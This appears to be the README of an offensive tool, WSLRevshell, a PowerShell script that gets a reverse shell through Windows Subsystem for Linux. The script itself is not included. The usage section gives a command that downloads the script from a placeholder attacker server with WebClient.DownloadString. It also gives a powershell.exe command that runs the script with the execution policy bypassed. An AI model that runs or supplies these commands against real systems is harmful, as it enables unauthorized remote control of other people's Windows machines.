# WSLRevshell
A simple powershell script to get a reverse shell through Windows Subsystem Linux

Usage:

Host the powershell script on your server and execute: (New-Object System.Net.WebClient).DownloadString("http:\\\\IPGOESHERE\WSLRevshell.ps1")

Alternatively you can download the file to the local PC and execute it using: powershell.exe -exec Bypass WSLRevshell.ps1
